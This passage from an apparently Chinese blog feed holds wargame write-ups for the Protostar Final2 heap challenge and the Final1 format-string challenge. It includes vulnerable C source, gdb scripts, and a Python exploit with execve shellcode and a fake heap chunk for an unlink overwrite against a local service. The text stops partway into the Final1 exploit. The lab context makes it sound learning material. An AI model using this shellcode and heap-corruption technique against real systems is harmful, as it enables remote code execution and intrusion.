* Work out old software bug</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  p = rindex(buf, <span class="string">'/'</span>);</span><br><span class="line">  l = <span class="built_in">strlen</span>(p);</span><br><span class="line">  <span class="keyword">if</span>(p) &#123;</span><br><span class="line">      start = <span class="built_in">strstr</span>(buf, <span class="string">"ROOT"</span>);</span><br><span class="line">      <span class="keyword">if</span>(start) &#123;</span><br><span class="line">          <span class="keyword">while</span>(*start != <span class="string">'/'</span>) start--;</span><br><span class="line">          memmove(start, p, l);</span><br><span class="line">          <span class="comment">//printf("moving from %p to %p (exploit: %s / %d)\n", p, start, start &lt; buf ? "yes" : "no", start - buf);</span></span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_requests</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *buf;</span><br><span class="line">  <span class="keyword">char</span> *destroylist[<span class="number">256</span>];</span><br><span class="line">  <span class="keyword">int</span> dll;</span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  dll = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span>(dll &gt;= <span class="number">255</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      buf = <span class="built_in">calloc</span>(REQSZ, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">read</span>(fd, buf, REQSZ) != REQSZ) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(buf, <span class="string">"FSRD"</span>, <span class="number">4</span>) != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">      check_path(buf + <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">      destroylist[i] = buf;</span><br><span class="line"></span><br><span class="line">      dll++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; dll; i++) &#123;</span><br><span class="line">      <span class="built_in">write</span>(fd, <span class="string">"Process OK\n"</span>, <span class="built_in">strlen</span>(<span class="string">"Process OK\n"</span>));</span><br><span class="line">      <span class="built_in">free</span>(destroylist[i]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID); </span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  get_requests(fd);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2><p>测试的脚本</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><figcaption><span>Final2_1.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">REQSZ = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2993</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(m)</span>:</span></span><br><span class="line">        padding = <span class="string">'\x00'</span>*(REQSZ-len(m))</span><br><span class="line">        _m = <span class="string">"FSRD"</span> + m + padding</span><br><span class="line">        <span class="keyword">return</span> _m[:REQSZ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = raw_input(<span class="string">"&gt; "</span>)</span><br><span class="line">        <span class="keyword">if</span> msg:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'msg: &#123;0&#125;'</span>.format(repr(pad(msg)))</span><br><span class="line">                s.send(pad(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p>gdb自动运行的命令</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>~/.gdbinit</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line"><span class="built_in">set</span> pagination off</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0804bd40</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"buf: %s\n"</span>, buf</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"dst: %s\n"</span>, start</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"src: %s\n"</span>, p</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"len"</span> %d\n<span class="string">", l</span></span><br><span class="line"><span class="string">continue</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">continue</span></span><br></pre></td></tr></table></figure></div><p>输入<code>AAAAA/ROOT/BBBB/CCCC</code><br><a href="https://dblu3.github.io/img/Protostar/final2_1.jpg" data-fancybox="group" data-caption="final2_1" class="fancybox"><img alt="final2_1" title="final2_1" data-src="https://dblu3.github.io/img/Protostar/final2_1.jpg" class="lazyload"></a></p><p>gdb查看内存<br><a href="https://dblu3.github.io/img/Protostar/final2_2.jpg" data-fancybox="group" data-caption="final2_2" class="fancybox"><img alt="final2_2" title="final2_2" data-src="https://dblu3.github.io/img/Protostar/final2_2.jpg" class="lazyload"></a></p><p>另一组输入<br><a href="https://dblu3.github.io/img/Protostar/final2_3.jpg" data-fancybox="group" data-caption="final2_3" class="fancybox"><img alt="final2_3" title="final2_3" data-src="https://dblu3.github.io/img/Protostar/final2_3.jpg" class="lazyload"></a></p><p>对应的内存<br><a href="https://dblu3.github.io/img/Protostar/final2_4.jpg" data-fancybox="group" data-caption="final2_4" class="fancybox"><img alt="final2_4" title="final2_4" data-src="https://dblu3.github.io/img/Protostar/final2_4.jpg" class="lazyload"></a></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>gdb查看ret和free的地址</p><p>address of ret:  0x0804be25<br>address of free: 0x0804be13</p><p>加入之前的命令中</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>~/.gdbinit</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> follow-fork-mode child</span><br><span class="line"><span class="built_in">set</span> disassembly-flavor intel</span><br><span class="line"><span class="built_in">set</span> pagination off</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0804bd40</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">x/<span class="number">64</span>wx <span class="number">0x804e000</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">"buf: %s\n"</span>, buf</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"dst: %s\n"</span>, start</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"src: %s\n"</span>, p</span><br><span class="line"><span class="built_in">printf</span> <span class="string">"len: %d\n"</span>, l</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="built_in">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0804be25</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">x/<span class="number">64</span>wx <span class="number">0x804e000</span></span><br><span class="line"><span class="built_in">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span> *<span class="number">0x0804be13</span></span><br><span class="line">commands</span><br><span class="line">silent</span><br><span class="line">x/<span class="number">64</span>wx <span class="number">0x804e000</span></span><br><span class="line"><span class="built_in">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure></div><p>发送数据</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><figcaption><span>Final2_2.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">REQSZ = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2993</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(m)</span>:</span></span><br><span class="line">        padding = <span class="string">'\x00'</span>*(REQSZ-len(m))</span><br><span class="line">        _m = <span class="string">"FSRD"</span> + m + padding</span><br><span class="line">        <span class="keyword">return</span> _m[:REQSZ]</span><br><span class="line"></span><br><span class="line">s.send(pad(<span class="string">'/ROOT/'</span> + <span class="string">'/'</span>*<span class="number">128</span>))</span><br><span class="line">s.send(pad(<span class="string">'ROOT/'</span> + <span class="string">'A'</span>*<span class="number">128</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = raw_input(<span class="string">"&gt; "</span>)</span><br><span class="line">        <span class="keyword">if</span> msg:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'msg: &#123;0&#125;'</span>.format(repr(pad(msg)))</span><br><span class="line">                s.send(pad(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final2_5.jpg" data-fancybox="group" data-caption="final2_5" class="fancybox"><img alt="final2_5" title="final2_5" data-src="https://dblu3.github.io/img/Protostar/final2_5.jpg" class="lazyload"></a></p><p><code>(gdb) disassemble get_requests</code></p><p><a href="https://dblu3.github.io/img/Protostar/final2_6.jpg" data-fancybox="group" data-caption="final2_6" class="fancybox"><img alt="final2_6" title="final2_6" data-src="https://dblu3.github.io/img/Protostar/final2_6.jpg" class="lazyload"></a></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"></span><br><span class="line">REQSZ = <span class="number">128</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'127.0.0.1'</span>, <span class="number">2993</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(m)</span>:</span></span><br><span class="line">        padding = <span class="string">'\x00'</span>*(REQSZ-len(m))</span><br><span class="line">        _m = <span class="string">"FSRD"</span> + m + padding</span><br><span class="line">        <span class="keyword">return</span> _m[:REQSZ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp = <span class="string">''</span></span><br><span class="line">exp += <span class="string">'\xeb\x0e'</span></span><br><span class="line">exp += <span class="string">'\x90'</span>*<span class="number">50</span> <span class="comment"># nop</span></span><br><span class="line">exp += shellcode</span><br><span class="line"></span><br><span class="line">addr_libc = <span class="number">0x804d41c</span><span class="number">-0xc</span></span><br><span class="line">addr_heap = <span class="number">0x804e020</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct a fake heap</span></span><br><span class="line">heap = struct.pack(<span class="string">"I"</span>, <span class="number">0xfffffffc</span>)</span><br><span class="line">heap += struct.pack(<span class="string">"I"</span>, <span class="number">0xfffffffc</span>)</span><br><span class="line">heap += struct.pack(<span class="string">"I"</span>, addr_libc)</span><br><span class="line">heap += struct.pack(<span class="string">"I"</span>, addr_heap)</span><br><span class="line"></span><br><span class="line">s.send(pad(<span class="string">'/ROOT/'</span> + exp + <span class="string">'/'</span>*<span class="number">128</span>))</span><br><span class="line">s.send(pad(<span class="string">'ROOT/'</span> + heap))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        msg = raw_input(<span class="string">"&gt; "</span>)</span><br><span class="line">        <span class="keyword">if</span> msg:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'msg: &#123;0&#125;'</span>.format(repr(pad(msg)))</span><br><span class="line">                s.send(pad(msg))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = telnetlib.Telnet()</span><br><span class="line">t.sock = s</span><br><span class="line">t.interact()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/Protostar/final2_7.jpg" data-fancybox="group" data-caption="final2_7" class="fancybox"><img alt="final2_7" title="final2_7" data-src="https://dblu3.github.io/img/Protostar/final2_7.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Final2&quot;&gt;&lt;a href=&quot;#Final2&quot; class=&quot;headerlink&quot; title=&quot;Final2&quot;&gt;&lt;/a&gt;Final2&lt;/h1&gt;&lt;p&gt;Final2: Protostar系列的最后一题了&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_final1</title>
    <link href="http://yoursite.com/2018/09/22/Protostar-final1/"/>
    <id>http://yoursite.com/2018/09/22/Protostar-final1/</id>
    <published>2018-09-22T13:18:00.000Z</published>
    <updated>2018-09-22T16:15:06.995Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Final1"><a href="#Final1" class="headerlink" title="Final1"></a>Final1</h1><p>Final1: remote blind format string</p><a id="more"></a><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Final1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;syslog.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final1"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2994</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> username[<span class="number">128</span>];</span><br><span class="line"><span class="keyword">char</span> hostname[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">logit</span><span class="params">(<span class="keyword">char</span> *pw)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">512</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">snprintf</span>(buf, <span class="keyword">sizeof</span>(buf), <span class="string">"Login from %s as [%s] with password [%s]\n"</span>, hostname, username, pw);</span><br><span class="line"></span><br><span class="line">  syslog(LOG_USER|LOG_DEBUG, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trim</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *q;</span><br><span class="line"></span><br><span class="line">  q = <span class="built_in">strchr</span>(str, <span class="string">'\r'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">  q = <span class="built_in">strchr</span>(str, <span class="string">'\n'</span>);</span><br><span class="line">  <span class="keyword">if</span>(q) *q = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">parser</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> <span class="built_in">line</span>[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"[final1] $ "</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(fgets(<span class="built_in">line</span>, <span class="keyword">sizeof</span>(<span class="built_in">line</span>)<span class="number">-1</span>, <span class="built_in">stdin</span>)) &#123;</span><br><span class="line">      trim(<span class="built_in">line</span>);</span><br><span class="line">      <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"username "</span>, <span class="number">9</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="built_in">strcpy</span>(username, <span class="built_in">line</span>+<span class="number">9</span>);</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strncmp</span>(<span class="built_in">line</span>, <span class="string">"login "</span>, <span class="number">6</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">          <span class="keyword">if</span>(username[<span class="number">0</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"invalid protocol\n"</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              logit(<span class="built_in">line</span> + <span class="number">6</span>);</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"login failed\n"</span>);</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"[final1] $ "</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getipport</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> l;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span></span><br><span class="line"></span><br><span class="line">  l = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">  <span class="keyword">if</span>(getpeername(<span class="number">0</span>, &amp;<span class="built_in">sin</span>, &amp;l) == <span class="number">-1</span>) &#123;</span><br><span class="line">      err(<span class="number">1</span>, <span class="string">"you don't exist"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">sprintf</span>(hostname, <span class="string">"%s:%d"</span>, inet_ntoa(<span class="built_in">sin</span>.sin_addr), ntohs(<span class="built_in">sin</span>.sin_port));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd;</span><br><span class="line">  <span class="keyword">char</span> *username;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Run the process as a daemon */</span></span><br><span class="line">  background_process(NAME, UID, GID);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Wait for socket activity and return */</span></span><br><span class="line">  fd = serve_forever(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Set the client socket to STDIN, STDOUT, and STDERR */</span></span><br><span class="line">  set_io(fd);</span><br><span class="line"></span><br><span class="line">  getipport();</span><br><span class="line">  parser();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>思路是用system的地址覆盖strncmp的地址</p><h2 id="strncmp"><a href="#strncmp" class="headerlink" title="strncmp"></a>strncmp</h2><p><a href="https://dblu3.github.io/img/Protostar/final1_1.jpg" data-fancybox="group" data-caption="final1_1" class="fancybox"><img alt="final1_1" title="final1_1" data-src="https://dblu3.github.io/img/Protostar/final1_1.jpg" class="lazyload"></a><br>连接后用root:godmode打开另一个终端</p><p>找到strncmp的地址<br><a href="https://dblu3.github.io/img/Protostar/final1_2.jpg" data-fancybox="group" data-caption="final1_2" class="fancybox"><img alt="final1_2" title="final1_2" data-src="https://dblu3.github.io/img/Protostar/final1_2.jpg" class="lazyload"></a></p><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p><a href="https://dblu3.github.io/img/Protostar/final1_3.jpg" data-fancybox="group" data-caption="final1_3" class="fancybox"><img alt="final1_3" title="final1_3" data-src="https://dblu3.github.io/img/Protostar/final1_3.jpg" class="lazyload"></a></p><h2 id="Offset"><a href="#Offset" class="headerlink" title="Offset"></a>Offset</h2><p><a href="https://dblu3.github.io/img/Protostar/final1_4.jpg" data-fancybox="group" data-caption="final1_4" class="fancybox"><img alt="final1_4" title="final1_4" data-src="https://dblu3.github.io/img/Protostar/final1_4.jpg" class="lazyload"></a></p><p><a href="https://dblu3.github.io/img/Protostar/final1_5.jpg" data-fancybox="group" data-caption="final1_5" class="fancybox"><img alt="final1_5" title="final1_5" data-src="https://dblu3.github.io/img/Protostar/final1_5.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">s = 